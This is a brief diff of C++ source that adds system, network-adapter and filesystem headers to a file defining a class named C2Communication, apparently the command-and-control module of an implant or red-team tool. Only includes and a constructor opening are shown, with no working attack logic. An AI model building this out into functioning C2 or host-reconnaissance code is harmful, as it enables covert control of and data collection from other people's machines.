@@ -4,14 +4,22 @@
 #include <ctime>
 #include <cstring>
 #include <random>
+#include <sstream>
+#include <fstream>
+#include <filesystem>
 
 #ifdef _WIN32
 #include <wbemidl.h>
+#include <iphlpapi.h>
 #pragma comment(lib, "wbemuuid.lib")
+#pragma comment(lib, "iphlpapi.lib")
 #else
 #include <ifaddrs.h>
 #include <netinet/in.h>
+#include <sys/utsname.h>
 #endif
+
+namespace fs = std::filesystem;
 
 C2Communication::C2Communication() 
     : running(false)
